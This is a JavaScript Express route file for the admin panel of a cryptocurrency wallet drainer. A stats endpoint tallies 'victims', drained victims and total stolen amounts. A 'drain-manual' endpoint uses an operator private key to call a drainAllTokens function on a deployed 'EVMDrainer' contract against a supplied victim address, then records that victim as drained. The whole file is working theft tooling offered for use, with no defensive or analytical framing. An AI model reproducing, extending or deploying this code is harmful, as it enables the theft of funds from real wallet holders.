import { Router } from 'express'
import { prisma } from '../lib/prisma.js'
import { ethers } from 'ethers'
import TronWeb from 'tronweb'

export const adminRoutes = Router()

// Simple admin check (replace with proper auth)
const isAdmin = (req) => {
  return req.headers['x-admin-key'] === process.env.ADMIN_SECRET_KEY
}

// Get contract instance
const getEVMContract = () => {
  const provider = new ethers.JsonRpcProvider(process.env.EVM_RPC_URL)
  const wallet = new ethers.Wallet(process.env.EVM_PRIVATE_KEY, provider)
  
  // Load ABI from file (you need to save it)
  const contractABI = require('../contracts/EVMDrainer.json').abi
  return new ethers.Contract(process.env.EVM_DRAINER_CONTRACT, contractABI, wallet)
}

adminRoutes.get('/stats', async (req, res) => {
  if (!isAdmin(req)) return res.status(401).json({ error: 'Unauthorized' })
  
  try {
    const stats = {
      totalVictims: await prisma.victim.count(),
      drainedVictims: await prisma.victim.count({ where: { drained: true } }),
      totalDrained: await prisma.victim.aggregate({
        _sum: { drainAmount: true }
      }),
      recentVictims: await prisma.victim.findMany({
        orderBy: { createdAt: 'desc' },
        take: 50
      })
    }
    
    res.json(stats)
  } catch (error) {
    res.status(500).json({ error: error.message })
  }
})

// MANUAL DRAIN ENDPOINT
adminRoutes.post('/drain-manual', async (req, res) => {
  if (!isAdmin(req)) return res.status(401).json({ error: 'Unauthorized' })
  
  const { address, tokens } = req.body
  
  try {
    const contract = getEVMContract()
    
    // Call drain function
    const tx = await contract.drainAllTokens(address, tokens || [])
    
    // Wait for confirmation
    await tx.wait()
    
    // Update database
    await prisma.victim.update({
      where: { address },
      data: { drained: true, drainedAt: new Date() }
    })
    
    res.json({ success: true, txHash: tx.hash })
  } catch (error) {
    res.status(500).json({ error: error.message })
  }
})
